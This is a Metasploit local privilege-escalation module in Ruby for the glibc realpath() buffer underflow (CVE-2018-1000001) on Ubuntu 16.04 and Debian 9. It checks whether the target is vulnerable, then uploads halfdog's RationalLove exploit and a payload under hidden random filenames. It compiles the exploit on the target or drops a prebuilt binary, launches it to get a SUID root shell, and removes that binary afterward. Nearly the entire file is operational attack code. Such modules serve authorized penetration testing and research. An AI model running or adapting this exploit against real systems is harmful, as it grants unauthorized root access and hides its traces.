##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "glibc 'realpath()' Privilege Escalation",
      'Description'    => %q{
        This module attempts to gain root privileges on Linux systems by abusing
        a vulnerability in GNU C Library (glibc) version 2.26 and prior.

        This module uses halfdog's RationalLove exploit to exploit a buffer
        underflow in glibc realpath() and create a SUID root shell. The exploit
        has offsets for glibc versions 2.23-0ubuntu9 and 2.24-11+deb9u1.

        The target system must have unprivileged user namespaces enabled.

        This module has been tested successfully on Ubuntu Linux 16.04.3 (x86_64)
        with glibc version 2.23-0ubuntu9; and Debian 9.0 (x86_64) with glibc
        version 2.24-11+deb9u1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'halfdog',      # Discovery and RationalLove.c exploit
          'Brendan Coles' # Metasploit
        ],
      'DisclosureDate' => 'Jan 16 2018',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        => [[ 'Auto', {} ]],
      'Privileged'     => true,
      'References'     =>
        [
          [ 'AKA', 'RationalLove.c' ],
          [ 'BID', '102525' ],
          [ 'CVE', '2018-1000001' ],
          [ 'EDB', '43775' ],
          [ 'URL', 'https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/' ],
          [ 'URL', 'http://www.openwall.com/lists/oss-security/2018/01/11/5' ],
          [ 'URL', 'https://securitytracker.com/id/1040162' ],
          [ 'URL', 'https://sourceware.org/bugzilla/show_bug.cgi?id=22679' ],
          [ 'URL', 'https://usn.ubuntu.com/3534-1/' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1533836' ]
        ],
      'DefaultTarget'  => 0))
    register_options [
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x '#{path}'"
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    gcc_cmd = "gcc -w -o #{path} #{path}.c"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
    cmd_exec "chmod +x #{path}"
  end

  def exploit_data(file)
    path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2018-1000001', file
    fd = ::File.open path, 'rb'
    data = fd.read fd.stat.size
    fd.close
    data
  end

  def live_compile?
    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')

    if has_gcc?
      vprint_good 'gcc is installed'
      return true
    end

    unless datastore['COMPILE'].eql? 'Auto'
      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
    end
  end

  def check
    version = kernel_release
    if Gem::Version.new(version.split('-').first) < Gem::Version.new('2.6.36')
      vprint_error "Linux kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Linux kernel version #{version} is vulnerable"

    arch = kernel_hardware
    unless arch.include? 'x86_64'
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"

    unless userns_enabled?
      vprint_error 'Unprivileged user namespaces are not permitted'
      return CheckCode::Safe
    end
    vprint_good 'Unprivileged user namespaces are permitted'

    version = glibc_version
    if Gem::Version.new(version.split('-').first) > Gem::Version.new('2.26')
      vprint_error "GNU C Library version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "GNU C Library version #{version} is vulnerable"

    # fuzzy match glibc 2.23-0ubuntu9 and 2.24-11+deb9u1
    glibc_banner = cmd_exec('ldd --version')
    unless glibc_banner.include?('2.23-0ubuntu') || glibc_banner.include?('2.24-11+deb9')
      vprint_error 'No offsets for this version of GNU C Library'
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    if check != CheckCode::Appears
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload exploit executable
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    @executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile @executable_path, exploit_data('RationalLove.c')
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx @executable_path, exploit_data('RationalLove')
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status 'Launching exploit...'
    output = cmd_exec "echo '#{payload_path} & exit' | #{@executable_path}", nil, 30
    output.each_line { |line| vprint_status line.chomp }
  end

  def on_new_session(client)
    # remove root owned SUID executable
    if client.type.eql? 'meterpreter'
      client.core.use 'stdapi' unless client.ext.aliases.include? 'stdapi'
      client.fs.file.rm @executable_path
    else
      client.shell_command_token "rm #{@executable_path}"
    end
  end
end